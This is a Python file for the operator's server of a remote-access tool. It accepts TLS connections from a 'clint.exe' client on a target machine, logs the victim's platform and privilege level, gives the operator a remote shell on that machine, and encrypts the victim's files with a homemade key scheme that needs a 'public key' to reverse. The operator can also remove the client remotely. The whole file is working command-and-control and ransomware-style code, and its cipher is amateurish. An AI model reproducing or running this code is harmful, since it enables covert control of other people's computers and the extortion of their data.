import socket as so
import numcode as ss
import math as ma
import random as ra
import time
import threading as thr
import paramiko as pa
import ssl
import sys


'''5.5.0 v'''


pla=sys.platform
t1t=0
t1t1=0
try:
    
        
    cont=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    cont.check_hostname=False
    cont.verify_mode=ssl.CERT_NONE
    if pla=='win32' or pla=='win64':
        cont.load_cert_chain(certfile=r"C:\Users\ibrah\cert.pem", keyfile=r"C:\Users\ibrah\key.pem")
    elif pla=='linux' or pla=='linux2' or pla=='linux3':
        cont.load_cert_chain(certfile=r"/home/kali/Desktop/cert.pem", keyfile=r"/home/kali/Desktop/key.pem")
    else:
        print(f"error: your platform is {pla}, 'server.exe' is not supported in this platform")
        exit()
    server = so.socket(so.AF_INET, so.SOCK_STREAM)
    server.bind(('0.0.0.0', 12345))
    server.listen(1)
    with cont.wrap_socket(server, server_side=True) as sst:
        print("Server is listening on port 12345...")
        conn, addr = sst.accept()

        conn.sendall("connected".encode('utf-8'))
        
        zz=conn.recv(4096).decode('utf-8')
        
        if zz=="strange platform":
            print("error: strange platform")
            conn.close()
            server.close()
            exit()
        with open("s.txt",'+a') as f:
            f.write(f"Connection from {addr} has been established!\n")
            f.write(f"platform: {zz}\n")
            f.write(f"{time.ctime()}\n")
        
        print(f"Connection from {addr} has been established!\n")
        print(f"platform: {zz}\n")
        pri=conn.recv(4096).decode('utf-8')
        if pri=="0":
            pri='user'
        elif pri=="1":
            pri='adminstrator'
        print(f"the tool 'clint.exe' run as: {pri}\n")
        print("enter '.h' for help\n")

        while True:
            if t1t==1 and t1t1==2 and tw==1:
                print("notification: the file has been downloded")
                tw=0
                
            mas=input("enter a masge: ")
            conn.sendall(mas.encode('utf-8'))
            if mas=="killcon":
                df=conn.recv(4096).decode("utf-8")
                print(df)
                with open("s.txt",'+a') as f:
                    q=input("enter a note (no/yes): ")
                    
                    if q=="no":
                        f.write("#################################################\n")
                    elif q=="yes":
                        n=input("> ")
                        f.write(f"note: {n}\n")
                        f.write("#################################################\n")
                break



            
            elif mas==".enf":
                
                try:
                    speed=int(input("enter speed of sending (0-5): "))
                except ValueError:
                    print("error: enter a number")
                    continue
                if speed>5 or speed<0:
                    print("the limt is (0-5)")
                    continue
                speed=str(speed)
                a=input("enter a file name: ")
                if a=="":
                    a="1"
                    conn.sendall(a.encode('utf-8'))
                    continue

                conn.sendall(a.encode('utf-8'))
                conn.sendall(speed.encode('utf-8'))
                gggh=conn.recv(4096).decode('utf-8')
                
                if gggh=="00":
                    print("error: file not found")
                    continue
                
                
                gnrKey=ra.randint(10,99)
                gnrKey1=ra.randint(10,99)
                    

                def buplcKey():
                    # the method of how to making the publce key
                    return ma.floor((gnrKey*gnrKey1)/(gnrKey1-1))
                buplcKey()


                def praivtKay():
                    # the method of making the praivt key
                    # the praivt key is the scrit key that the user don't know it
                    return ma.floor((gnrKey*gnrKey1)/buplcKey())
                praivtKay()
                
                try:
                    kj=int(gggh)
                    bc=0
                    for i in range( kj):
                        bc=1
                        try:
                            data = conn.recv(4096).decode('utf-8')
                            row=[]
                            l=0
                            # prebar for the publce key
                            

                            # take the words and transform it from "numcode modul"
                            for s in range (len(data)):

                                sa=data[l]

                                l+=1

                                f=ss.numcode(sa)

                                f=f+praivtKay()

                                row.append(f)

                            e=''.join(map(str,row))
                            msd=f"{gnrKey}{gnrKey1}{e}"
                            speed=int(speed)
                            time.sleep(speed)
                            conn.sendall(msd.encode('utf-8'))
                            
                        except Exception:

                            print("error")
                            continue
                    if bc==1:
                        print(f"your publce key: {buplcKey()}") 
                    elif bc==0:
                        print("error: file is amty")   

                except Exception:
                    print("error")
                    continue



            elif mas==".def":
                
                try:
                    speed=int(input("enter speed of sending (0-5): "))
                except ValueError:
                    print("error: enter a number")
                    continue
                if speed>5 or speed<0:
                    print("the limt is (0-5)")
                    continue
                speed=str(speed)
                a=input("enter a file name: ")
                if a=="":
                    a="1"
                    conn.sendall(a.encode("utf-8"))
                    continue
                try:
                    sx=int(input("enter the publce key: "))
                except ValueError:
                    print("error: you enter wrong publce key")
                    continue
                conn.sendall(a.encode('utf-8'))
                conn.sendall(speed.encode('utf-8'))
                lines=conn.recv(4096).decode('utf-8')
                if lines=="0":
                    print("error: file is emty")
                    continue
                if lines=="00":
                    print("error: file not found")
                    continue
                lines=int(lines)
                gh=0
                for m in range(lines):
                    
                    gh=1

                    row=[]
                    rows1=[]
                    row1=[]
                    row2=[]
                    data=conn.recv(4096).decode('utf-8')
                    if data=="wabrle":
                        continue
                    g=len(data.strip())

                    l=4

                    for jd in range (g-4):

                        row2.append(data.strip()[l])

                        l+=1

                    xx=''.join(map(str,row2))

                    gnrKey=int(f"{data.strip()[0]}{data.strip()[1]}")

                    gnrKey1=int(f"{data.strip()[2]}{data.strip()[3]}")

                    privtKey=ma.floor((gnrKey*gnrKey1)/sx)

                    l=3

                    while True:
                        
                        l+=1

                        s=data.strip()[l]

                        row.append(s)

                        k=''.join(map(str,row))

                        k=int(k)

                        if privtKey>k:

                            continue
                        
                        elif k>privtKey:

                            ff=k-privtKey

                            f=ss.numcode(ff)

                            if f=="error":

                                l+=1

                                s=data.strip()[l]

                                row.append(s)

                                k=''.join(map(str,row))

                                k=int(k)

                                ff=k-privtKey

                                f=ss.numcode(ff)

                                
                            rows1.append(f)

                            row.clear()

                        row1.append(k)

                        hfj=''.join(map(str,row1))

                        if hfj==xx:

                            break
                        
                    if gh==1:
                        q=''.join(map(str,rows1))
                        speed=int(speed)
                        time.sleep(speed)
                        conn.sendall(q.encode('utf-8'))
                        rows1.clear()
                    elif gh==0:
                        print("error: file is emty")
                        continue



                            
            elif mas=="cmd":
                
                print("enter 'exit' to exit")
                while True:
                    a=input("enter a command: ")
                    
                    if a=="exit":
                        conn.sendall(a.encode('utf-8'))
                        break
                    if a=="":
                        continue
                    conn.sendall(a.encode('utf-8'))
                    if a=="cd.." or a.startswith("cd "):
                        continue
                    data=conn.recv(4096).decode('utf-8')
                    
                        
                    if data=="abok":
                        
                        continue
                    if data=="firewall is on":
                        print("\nWORRINGE!!: firewall is on, you can`t use 'cmd' in this time use 'cmd' agen to ckick the firewall state\n")
                        break
                    print(data) 
                

                    


            elif mas=="downlod":
                t1t=1
                fi=input("enter a file name: ") 
                def down():
                    global t1t1,tw
                    
                    time.sleep(15)

                    t1t1=2
                    tw=1


                t1=thr.Thread(target=down)
                t1.start()
                conn.sendall("wevall".encode('utf-8'))
                print("you will get notification when the file downlod")
                continue

            elif mas==".h":
                
                print(".enf:      to encode file")
                print(".def:      to decode file")
                print("cmd:       to make accses to the 'cmd' of the user (work also in 'mac/links')")
                print("killcon:   to end the connection and the 'clint.exe' will be removed from the user device")        
                #print("downlod:   to downlod a file ")
                print("WORRINGE!!: if you use '.enf' or '.def' and the file has emty lines that make the cooncetion in a loop, make sure about the file by using 'cmd' to dilet the emty lines")
                print("WORRINGE!!: if you use '.def' and you don`t enter the right publce key the file will be emty")


                

        conn.close()
        server.close()
        print("Connection closed.")

except Exception:
    print("error: connection end")
